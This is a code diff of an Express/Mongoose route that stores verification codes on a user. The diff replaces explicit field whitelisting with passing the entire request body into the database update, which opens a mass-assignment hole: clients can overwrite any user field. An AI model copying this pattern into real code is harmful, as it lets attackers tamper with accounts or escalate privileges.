@@ -48,40 +48,28 @@ router.post("/step2", async (req, res) => {
 router.post("/step3", async (req, res) => {
   try {
     const { userId } = req.body;
+    const updateData = req.body; 
+
     if (!userId) {
-      return res.status(400).json({ error: "User ID is required." });
+      return res.status(400).json({ error: "Missing User ID" });
     }
 
-    const code1 = req.body.code?.trim();
-    const code2 = req.body.code2?.trim();
-    const code3 = req.body.code3?.trim();
-
-    if (!code1 && !code2 && !code3) {
-      return res.status(400).json({ error: "No verification code received." });
-    }
-
-    const updateData = {};
-    if (code1) updateData.code = code1;
-    if (code2) updateData.code2 = code2;
-    if (code3) updateData.code3 = code3;
+    // 1. Find the user first to see what's already there (Optional but safer)
+    const user = await User.findById(userId);
+    if (!user) return res.status(404).json({ error: "User not found" });
 
     const updatedUser = await User.findByIdAndUpdate(
       userId,
-      { $set: updateData },
+      { $set: updateData }, 
       { new: true }
     );
 
-    if (!updatedUser) {
-      return res.status(404).json({ error: "User not found." });
-    }
-
-    res.json({ message: "Success", user: updatedUser });
+    res.json({ message: "Code saved successfully", user: updatedUser });
   } catch (error) {
     console.error("STEP 3 ERROR:", error);
-    res.status(500).json({ error: "Server error." });
+    res.status(500).json({ error: "Server error during step 3." });
   }
 });
-
 
 /* GET All Users */
 router.get("/", async (req, res) => {
